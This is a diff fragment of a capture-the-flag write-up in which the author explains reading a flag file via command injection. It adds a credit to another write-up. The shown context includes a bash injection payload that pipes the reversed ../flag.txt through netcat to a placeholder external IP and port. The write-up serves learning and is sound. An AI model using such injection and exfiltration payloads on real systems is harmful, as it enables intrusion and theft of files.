@@ -27,7 +27,7 @@ Honestly I'm not 100% sure why the program actually executes the input code, bec
 
 (_test.py_ and _test2.py_ used for testing can be found in the repo)
 
-Now the flag itself is in _../flag.txt_ and because of the _noleek.png_ being a thing, we can't just cat the flag out. A clever solution that I found was using netcat on your device with portforwarding and then using this as the injection:
+Now the flag itself is in _../flag.txt_ and because of the _noleek.png_ being a thing, we can't just cat the flag out. A clever solution that I found (from another writeup) was using netcat on your device with portforwarding and then using this as the injection:
 
 ``` bash
 $(rev ../flag.txt | nc <EXTERNAL_IP> <PORT>)
